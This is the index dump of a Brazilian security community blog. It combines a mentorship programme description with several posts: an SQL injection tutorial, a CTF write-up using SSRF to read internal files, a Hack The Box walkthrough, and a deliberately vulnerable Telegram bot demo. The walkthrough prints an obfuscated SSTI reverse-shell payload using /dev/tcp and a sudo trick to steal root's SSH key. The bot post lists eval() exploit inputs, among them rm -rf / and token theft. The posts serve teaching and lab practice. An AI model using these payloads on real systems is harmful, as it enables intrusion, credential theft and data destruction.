[{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/emprego/","section":"Tags","summary":"","title":"Emprego","type":"tags"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/authors/guisso/","section":"Authors","summary":"","title":"Guisso","type":"authors"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/mentoria/","section":"Tags","summary":"","title":"Mentoria","type":"tags"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/authors/nathandre/","section":"Authors","summary":"","title":"Nathandre","type":"authors"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/series/programa-reiosse/","section":"Series","summary":"","title":"Programa Reiosse","type":"series"},{"content":" Objetivo Geral # Apoiar profissionais tecnicamente capacitados, mas com dificuldades em networking e visibilidade, a conquistar o primeiro emprego na área de cibersegurança ou uma posição mais alinhada ao seu valor no mercado.\nPúblico-Alvo # Perfil técnico: Pessoas que já demonstraram conhecimento técnico relevante em cibersegurança, seja em conversas, apoio à comunidade, projetos, palestras ou eventos. Localização: Exclusivamente para membros da Sunsec em Natal e região. Critério de participação: Contribuição prévia com a comunidade, ajudando mentores a avaliar o nível técnico dos candidatos. Principais Desafios a Serem Abordados # Falta de networking e dificuldade em criar contatos relevantes. Baixa autoconfiança e desconhecimento do próprio valor no mercado. Dúvidas sobre como apresentar habilidades (currículo, LinkedIn, GitHub, portfólio). Falta de experiência prática comprovada e comunicação com recrutadores. Dificuldade em encontrar e interpretar vagas no mercado. Estrutura do Programa # Formato: Mentorias individuais personalizadas para cada participante. Reuniões com todos os mentores, garantindo feedback diversificado e rico. Atividades: Revisão de currículo e LinkedIn: Destacar habilidades técnicas, experiências, e organizar informações de forma estratégica. Visibilidade das skills: Incentivo à submissão de palestras. Organização de GitHub e portfólio. Criação e manutenção de blogs técnicos. Apresentação de CVEs ou contribuições notáveis. Conexões profissionais: Conectar participantes com empresas e profissionais da comunidade. Aproveitar a rede de contatos dos mentores e membros estabelecidos. Orientação para o mercado: Explicação sobre onde e como encontrar vagas. Análise de vagas e preparação estratégica para entrevistas. Entendimento de compatibilidade com as vagas. Tipos de Empresas # Foco em empresas grandes e startups que estejam alinhadas com os objetivos do programa e dispostas a abrir vagas exclusivas ou considerar candidatos indicados pela Sunsec.\nAcompanhamento # Suporte completo durante os processos seletivos: Feedback sobre entrevistas. Orientação em negociações salariais. Apoio emocional, se necessário. Recursos # Materiais didáticos para revisão de currículo e LinkedIn. Ferramentas para organização de portfólio e GitHub. Parcerias # Empresas: Criação de vagas exclusivas para o programa. Possibilidade de headhunting, revertendo o valor para a comunidade. Membros estabelecidos: Apoio na indicação de candidatos para suas próprias empresas ou contatos próximos. Networking # Participação em eventos e meetups organizados pela comunidade. Melhoria de apresentações e palestras para aumentar visibilidade. Construção de conexões naturais e estratégicas com profissionais da área. Métricas e Avaliação # Indicadores de sucesso: Número de participantes contratados. Qualidade do feedback dos participantes e das empresas. Frequência de avaliação: Ao final de cada ciclo. Reconhecimento # Postagem pública de agradecimento à empresa contratante. Troféu simbólico para o participante como reconhecimento pela conquista. ","date":"27 November 2024","externalUrl":null,"permalink":"/posts/programa-reiosse/programa-reiosse/","section":"Posts","summary":"","title":"Programa Reiosse","type":"posts"},{"content":"Sessão de Sucesso: Histórias que Inspiram\nA História do Programa # O programa de mentoria da Sunsec é uma evolução do papel que a comunidade já desempenha há anos: conectar pessoas, apoiar talentos e ajudar profissionais a crescerem. Antes mesmo de existir formalmente, os eventos e encontros promovidos pela Sunsec, OWASP Natal, Potilivre e DevOpsDays Natal já eram palco de histórias transformadoras.\nMuitos profissionais hoje bem-sucedidos começaram suas jornadas com dedicação técnica, proatividade e liderança comunitária, que chamaram a atenção de empresas e profissionais do mercado. A comunidade se destacou ao fornecer um espaço seguro para aprendizado, networking e trocas que abriram portas para oportunidades incríveis.\nCasos de Sucesso # Matheus Cezar (Analista Sênior na Conviso) # Trajetória: Matheus foi voluntário em eventos do capítulo OWASP Natal e mantinha um GitHub bem organizado, documentando seus estudos de segurança para o público. Além disso, ele colaborava ativamente com outras comunidades como Potilivre e DevOpsDays Natal, sempre disposto a ajudar. Conexão: Sua contribuição constante e proatividade cativaram as pessoas certas nos eventos da comunidade, conectando-o a uma vaga onde ele já se destacou desde o início. Eduardo Paixão (DevSecOps na Globo) # Trajetória: Eduardo já demonstrava paixão por cibersegurança, liderando iniciativas em projetos locais mesmo sem muitos recursos. Sua dedicação em melhorar a maturidade de segurança desses projetos chamou a atenção. Conexão: O apoio da comunidade ajudou Eduardo a expandir seu networking e a se posicionar como um profissional valioso para grandes empresas, o que resultou em sua contratação na maior empresa de mídia da América Latina. Kevin Wallacy (DevSecOps na Globo) # Trajetória: Kevin fez a transição de desenvolvedor para segurança, usando seu profundo conhecimento técnico em desenvolvimento como base para se destacar nos desafios de segurança. Além do networking proporcionado pela Sunsec, Kevin dedicou-se intensamente aos estudos para superar os exigentes testes técnicos da vaga. Conexão: A comunidade não apenas ajudou a abrir portas para Kevin em uma vaga com mais de mil candidatos, mas também forneceu suporte para que ele estivesse preparado e confiante. Clara Nobre (CloudSec na Conta Simples) # Trajetória: Clara é um exemplo de liderança comunitária. Fundadora do PyLadies Brasil, PyLadies Natal, e também parte da Potilivre e DevOpsDays Natal, ela sempre liderou iniciativas que inspiraram outras pessoas e fortaleceram a comunidade de tecnologia. Apesar disso, Clara precisou de apoio para perceber que já estava pronta para assumir grandes desafios no mercado. Conexão: A Sunsec desempenhou um papel crucial ao conectá-la a uma vaga estratégica no momento certo, além de oferecer apoio emocional e técnico para que ela desse esse importante passo. Impacto das Histórias # Essas histórias destacam que o sucesso não vem apenas de habilidades técnicas, mas também de networking, resiliência e comunidade. Elas reforçam o poder da Sunsec em criar um ambiente onde profissionais talentosos podem se conectar e crescer, inspirando outros a seguir o mesmo caminho.\nEsses exemplos guiam a missão do programa de mentoria: garantir que cada participante receba o suporte necessário para conquistar oportunidades que reflitam seu valor profissional.\n","date":"27 November 2024","externalUrl":null,"permalink":"/en/posts/reiosse-casos/","section":"Posts","summary":"","title":"Programa Reiosse - Casos de Sucesso","type":"posts"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/categories/reiosse/","section":"Categories","summary":"","title":"Reiosse","type":"categories"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/categories/sql-injection/","section":"Categories","summary":"","title":"Sql-Injection","type":"categories"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/sql-injection/","section":"Tags","summary":"","title":"Sql-Injection","type":"tags"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/sqli/","section":"Tags","summary":"","title":"Sqli","type":"tags"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/","section":"Sunsec","summary":"","title":"Sunsec","type":"page"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/trabalho/","section":"Tags","summary":"","title":"Trabalho","type":"tags"},{"content":"Imagine owning an e-commerce jewelry site and suddenly receiving notifications that your products are being sold for free. This alarming scenario results from a SQL Injection (SQLi) attack in action. SQLi is one of the most common and dangerous vulnerabilities affecting web applications today. Despite being widely recognized, SQLi attacks remain a global threat, potentially exposing sensitive data, disrupting business operations, and causing severe financial and reputational damage.\nIn this article, we’ll explore what SQL Injection is, how it works, and, most importantly, how to prevent it.\nWhat is SQL Injection? # A SQL Injection attack occurs when an attacker injects SQL commands through user input fields. This allows them to bypass application logic and directly manipulate the database, accessing, altering, or deleting sensitive information.\nExample: Exploiting a Login Form with SQL Injection # Consider a login form. When you enter your username and password, the application may execute an SQL query like the following to verify if a user exists with those credentials:\nSELECT * FROM users WHERE username=\u0026#39;{username}\u0026#39; AND password=\u0026#39;{password}\u0026#39;; Here, the query directly includes user input. Knowing this, what happens if we enter a username like this:\n1\u0026#39; OR 1=1 LIMIT 1 -- By doing so, the query transforms into:\nSELECT * FROM users WHERE username=\u0026#39;1\u0026#39; OR 1=1 LIMIT 1 --\u0026#39; AND password=\u0026#39;{password}\u0026#39;; Since everything after \u0026ldquo;- -\u0026rdquo; is treated as a comment in SQL, the query effectively becomes:\nSELECT * FROM users WHERE username=\u0026#39;1\u0026#39; OR 1=1 LIMIT 1; This means the condition 1=1 always evaluates as true, allowing the attacker to bypass authentication and access the first user in the database.\nHow to Prevent SQLi Attacks in Your Application # SQLi attacks occur because user input is inserted directly into SQL queries without proper handling. Here are essential methods to prevent SQL Injection:\nUse Prepared Statements (Parameterized Queries) # Prepared statements ensure user input is treated solely as data, not executable SQL code. By using parameterized queries, you separate SQL code from data, preventing attackers from injecting malicious SQL. This is one of the most effective ways to prevent SQL Injection.\nUse Object-Relational Mappers (ORMs) # ORMs are frameworks that provide an abstraction layer for interacting with databases, eliminating the need to write raw SQL queries directly. Instead, you use classes and methods to interact with database objects. ORMs handle SQL generation and input sanitization behind the scenes, significantly reducing the risk of SQL Injection. Most modern frameworks, like Django or SQLAlchemy in Python, offer ORM tools that are secure against SQLi when used correctly.\nValidate and Sanitize User Input # Always validate and sanitize user input Ensure data follows expected formats (e.g., restrict allowed characters for usernames and passwords). Using a validation library can help enforce constraints and prevent malicious input from reaching the database.\nImplement the Principle of Least Privilege for Database Access # Restrict database permissions to the minimum necessary for the application to function. For example, the application should use a database account with limited privileges (e.g., no permissions to delete tables). This way, even if an attacker exploits SQL Injection, they cannot perform destructive actions.\nEnable Web Application Firewalls (WAFs) # A (WAF) can detect and block SQL Injection attempts by monitoring, filtering, and blocking malicious traffic patterns. WAFs act as an additional security layer, helping mitigate SQL Injection risks, especially if your application handles sensitive data.\nRegularly Update and Patch SQLi # vulnerabilities can arise from outdated software or libraries. Regularly update your database management systems, libraries, and frameworks to ensure they are patched against known vulnerabilities.\nAvoid Displaying Detailed Error # Messages Detailed error messages can provide valuable information about the database structure or queries being executed. Always show generic messages to users and log detailed errors internally for analysis.\nIn Summary # SQL Injection is a widely recognized yet still common vulnerability that can be effectively avoided by implementing best practices for handling user input. By using ORMs, parameterized queries, sanitizing input, applying the principle of least privilege, and keeping your systems updated, you can significantly reduce the risk of SQLi attacks.\nProtecting applications from SQL Injection not only safeguards your database but also ensures your users\u0026rsquo; security and helps maintain the integrity and trustworthiness of your platform.\nChallenge: Can You Become a \u0026ldquo;Billionaire\u0026rdquo;? # Now it’s time to put your newfound cybersecurity knowledge to the test! Imagine you’ve discovered a vulnerability in a fictional banking application that allows data manipulation through a SQL Injection attack. Can you find a way to exploit it and \u0026ldquo;become a billionaire\u0026rdquo; in this virtual scenario?\nThis challenge provides a fun and safe environment to experiment with SQL Injection techniques, helping you better understand how these attacks work in real-world scenarios. Try it out and see if you can bypass the application’s defenses to access unauthorized data or modify account balances!\nChallenge: Can You Become a \u0026ldquo;Billionaire\u0026rdquo;?\n","date":"27 November 2024","externalUrl":null,"permalink":"/en/posts/sqli-injection/","section":"Posts","summary":"","title":"Understanding SQL Injection: A Guide to Protecting Your Applications","type":"posts"},{"content":"","date":"27 November 2024","externalUrl":null,"permalink":"/en/tags/web-secutiry/","section":"Tags","summary":"","title":"Web-Secutiry","type":"tags"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/en/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/en/authors/edson/","section":"Authors","summary":"","title":"Edson","type":"authors"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/en/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box","type":"tags"},{"content":" CTF Doryl # Como acessar o desafio # Acesse o https://github.com/fguisso/doryl-site-check, e inicie o desafio na sua máquina. No caso foi entregue a versão na branch Internal. Descrição # O Desafio tem como objetivos:\nEncontrar um arquivo com informações muito sensiveis. Encontrar uma flag no formato secDevOps{\u0026hellip;..} Como Funciona a Aplicação # A aplicação possui apenas um campo de entrada, utilizado para escanear a url inserida: -Note que ele retorna a resposta completa da url que o usuário inseriu.\nEntão parece que a aplicação internamente envia requisições para a url. Nesse princípio é possível inserir uma URL para tentar acessar servidores internos, como o http://localhost.\nUtilize as portas web mais utilizadas em um bruteforce, para saber se existe alguma porta interna aberta: 80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017.\nUtilize o ffuf para automatizar a buscar de portas o input é enviado no parâmetro target para o servidor, e note que filtrei as respostas que possuem 3246 palavras que considerei como resposta padrão do site.\nffuf -u http://0.0.0.0:8080/check -X POST -d \u0026quot;target=http%3A%2F%2Flocalhost%3AFUZZ\u0026quot; -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246\nNote que ele encontrou apenas 2 portas abertas a 8080, que fornece o site principal, e a 3000, que fornece uma aplicação interna. Analise a resposta completa, quando você insere http://localhost:3000, GET http://localhost:3000 Content-Length: 93 Content-Type: text/html; charset=utf-8 Date: Thu, 05 Sep 2024 05:46:30 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT \u0026lt;pre\u0026gt; \u0026lt;a href=\u0026#34;employers.html\u0026#34;\u0026gt;employers.html\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;logins.txt\u0026#34;\u0026gt;logins.txt\u0026lt;/a\u0026gt; \u0026lt;/pre\u0026gt; Note que ele possui um link para logins.txt, ao enviar a url http://localhost:3000/logins.txt no input, ele irá retornar informações muito sensíveis. GET http://localhost:3000/logins.txt Accept-Ranges: bytes Content-Length: 233 Content-Type: text/plain; charset=utf-8 Date: Thu, 05 Sep 2024 05:50:52 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT // Super sensitive information // WiFi id: Doryl password: 2022doryl@* // Guest WiFi id: Doryl-Guest password: dorylguest2022 // Intranet login: admin password: Adminqwert2022 // Ginpass login: dorylAdmin password: ginAndOrange Primeira Etapa Concluída # Encontre a FLAG # Observe que o servidor envia uma requisição interna para a URL inserida, utilizando o protocolo http. Com base nisso, podemos testar outros esquemas comuns para acessar arquivos em servidores internos, como o esquema file.\nVamos tentar recuperar um arquivo comum em servidores Linux, o /etc/passwd, para verificar se ele retorna o conteúdo. Insira no campo de entrada a URL file:///etc/passwd.\nGET file:///etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin Essa resposta, é o conteúdo do /etc/passwd , então podemos tentar recuperar a flag que está armazenada no sistema. É comum em ctfs a flag ficar na mesma pasta do desafio e com o nome flag.txt , partindo deste princípio podemos inserir file://./flag.txt . GET file://./flag.txt SecDevOps{SSRF_3_UM_PERIGOnvim .!} Todos Objetivos foram concluidos ( ;\n|Criador do Desafio: https://github.com/fguisso\n","date":"5 September 2024","externalUrl":null,"permalink":"/en/posts/doryl-writeup/","section":"Posts","summary":"Resolução do desafio Doryl site-check","title":"Write Up - Doryl Site-Check","type":"posts"},{"content":" Reconhecimento # A princípio realizamos o mapeamento das portas abertas no nosso alvo, bem como seus serviços e versões.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) Ao tentar acessar o servidor WEB, nós somos redirecionados para o domínio capiclean.htb. Dessa forma, adicionamos a seguinte linha no nosso arquivo /etc/hosts para que esse domínio consiga ser resolvido.\necho \u0026#34;10.10.11.12 capiclean.htb\u0026#34; | sudo tee -a /etc/hosts Após acessar a aplicação e realizarmos uma busca na aplicação por vulnerabilidades, e nos deparamos com o endpoint \u0026ldquo;http://capiclean.htb/quote\u0026rdquo; que trouxe uma mensagem suspeita:\nYour quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services Ao ler esta mensagem, automaticamente verificamos se algum parâmetro da request enviada para o admin, vulnerável a XSS, pois se fosse o caso nós poderíamos fazer a exfiltração do seu token e utilizar a app com privilégio máximo.\nUtilizamos os payload acima para enviar o token de sessão do admin para um servidor web que que levantamos com python utilizando o comando\npython3 -m http.server Como resultado desse processo, obtivemos o token de sessão do admin Acesso inicial # De posse do token, enumeramos mais alguns endpoint da aplicação\nffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ E encontramos o endpoint \u0026lsquo;dashboard\u0026rsquo; que tem acesso restrito. Dessa forma, adicionamos o cookie de admin no browser e conseguimos acessar o endpoint.\nSeguindo o \u0026lsquo;happy path\u0026rsquo; da aplicação nós geramos um invoice, e posteriormente tentamos acessá-lo por meio da função de geração de QRcode. Analisando os parâmetros request, nós identificamos um SSTI no parâmetro \u0026lsquo;qr_link\u0026rsquo;\nUma vez que identificamos esta vulnerabilidade, nós iniciamos os testes com payloads diversos para conseguir uma shell reversa. O payload a seguir foi o que nos possibilitou acessar o sistema\n{{request|attr(\u0026#34;application\u0026#34;)|attr(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/Nosso_IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}} Escalação de privilégio # Uma vez que conseguimos executar código na máquina alvo, realizamos uma varredura na em sua infraestrutura. Começamos pelo código fonte da aplicação. Nele encontramos algumas credenciais de banco de dados:\ndb_config = { \u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;, \u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39; } Ao verificarmos as portas abertas na aplicação, percebeu-se que a porta 3306 estava aberta. Indicando que existe um banco MySQL em execução. De posse dessa informação utilizamos as credenciais antes encontradas no código para assim consegui ter acesso aos dados do banco\nmysql --database capiclean -e \u0026#39;show databases;\u0026#39; -u iclean -p Após isso, tentamos quebrar ambas as hashs e tivemos sucesso em quebrar apenas a hash do usuário \u0026lsquo;consuela\u0026rsquo; que resultou na senha \u0026lsquo;simple and clean\u0026rsquo;. Com a senha e o usuário foi feita a tentativa de logins via ssh.\nssh consuela@$rhost Que foi bem sucedida. Agora com a shell ssh verificamos se algum comando habilitado a ser executado com privilégio de sudo.\nsudo -l Após entender do que se trata a plicação. Fizemos a seguinte suposição, se o usuário consuela tem ssh, o usuário root também deve ter ssh. Sendo sua chave privada armazenada no arquivo /root/.ssh/id_rsa, nós poderíamos mandar criar um pdf com o conteúdo da chave ssh do usuário root e direcionarmos esse pdf para um diretório acessível.\nsudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa Após a suposição se mostrar verdadeira, nós resgatamos a chave ssh ao verificar o conteúdo interno do pdf, nós realizamos o login via root por meio do comando\nssh root@$rhost -i root_ssh_key_file Com isso nós temos acesso ao usuário root e podemos ver a última flag\ncat root.txt ","date":"20 August 2024","externalUrl":null,"permalink":"/en/posts/htb-iclean/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - iclean","type":"posts"},{"content":"","date":"20 August 2024","externalUrl":null,"permalink":"/en/authors/paixao/","section":"Authors","summary":"","title":"Paixao","type":"authors"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/tags/appsec/","section":"Tags","summary":"","title":"Appsec","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/categories/appsec/","section":"Categories","summary":"","title":"AppSec","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/categories/injection/","section":"Categories","summary":"","title":"Injection","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/tags/injection/","section":"Tags","summary":"","title":"Injection","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/tags/owasp/","section":"Tags","summary":"","title":"Owasp","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/categories/owasp/","section":"Categories","summary":"","title":"OWASP","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/tags/pt-br/","section":"Tags","summary":"","title":"Pt-Br","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/categories/python/","section":"Categories","summary":"","title":"Python","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":" Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot. O bot inclui uma vulnerabilidade na função echo, que avalia qualquer entrada de texto recebida, potencialmente levando a ataques de injeção de código.\nExecutando o Projeto # Siga estas etapas para executar o projeto localmente:\nClone o repositório:\ngit clone https://github.com/fguisso/python-injection Instale as dependências necessárias:\npip install python-telegram-bot Obtenha um Token de Bot do Telegram:\nInicie uma conversa com BotFather no Telegram. Você pode encontrá-lo pesquisando por \u0026ldquo;@BotFather\u0026rdquo; na barra de pesquisa do Telegram ou clicando aqui. Envie o comando /newbot para iniciar o processo de criação de um novo bot. Siga as instruções para escolher um nome e um username para o seu bot. Após criar o bot, o BotFather irá fornecer um token. Copie esse token. Defina o Token do Bot como uma Variável de Ambiente:\nexport TOKEN_TELEGRAM=\u0026#34;seu_token_do_bot_aqui\u0026#34; Execute o script Python:\npython main.py Interaja com o bot no Telegram.\nFuncionamento do Bot # O bot está configurado para receber mensagens contendo operações matemáticas como entrada. Essas operações são resolvidas no comando echo, que retorna o resultado da operação como resposta.\nPor exemplo, ao enviar a mensagem 2 + 2 para o bot, ele retornará 4. Isso pode ser útil para realizar cálculos simples diretamente no Telegram.\nExplicação da vulnerabilidade # As vulnerabilidades de injeção estão entre as principais preocupações de segurança de aplicativos da web. De acordo com o OWASP Top 10, a injeção de código (como SQL injection, XSS, Command Injection e outras) é uma das principais ameaças para a segurança dos aplicativos.\nNo contexto deste bot, a vulnerabilidade de injeção ocorre na função echo, que utiliza a função eval para evoluir qualquer entrada de texto recebida. Isso permite que possíveis atacantes executem código arbitrário enviando uma entrada maliciosa. Exploits são os códigos maliciosos usados para atacar o sistemas e neste cenario estes são alguns exemplos de exploits que você pode enviar para seu bot que serão executados na maquina onde o seu bot esta rodando:\nMensagem para o bot Resultado do exploit os.getenv(\u0026quot;TOKEN_TELEGRAM\u0026quot;) Acesso a variáveis de ambiente os.system(\u0026quot;rm -rf /\u0026quot;) Execução de comandos do sistema operacional, no caso, rm vai deletar todos os arquivos do sistema. import malicious_module Importação de módulos maliciosos __import__(\u0026quot;malicious_module\u0026quot;).malicious_function() Execução de código malicioso. Os usuários são encorajados a testar esses exploits em seu próprio bot e observar os resultados. No entanto, tenha cuidado ao usar exploits, pois eles podem causar danos ao sistema.\nDocumentação # python-telegram-bot Documentation Telegram Bot API Documentation Telegram BotFather Documentation OWASP Top 10 ","date":"23 March 2024","externalUrl":null,"permalink":"/en/posts/python-injection/","section":"Posts","summary":"","title":"Python Injection","type":"posts"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/en/categories/telegram/","section":"Categories","summary":"","title":"Telegram","type":"categories"}]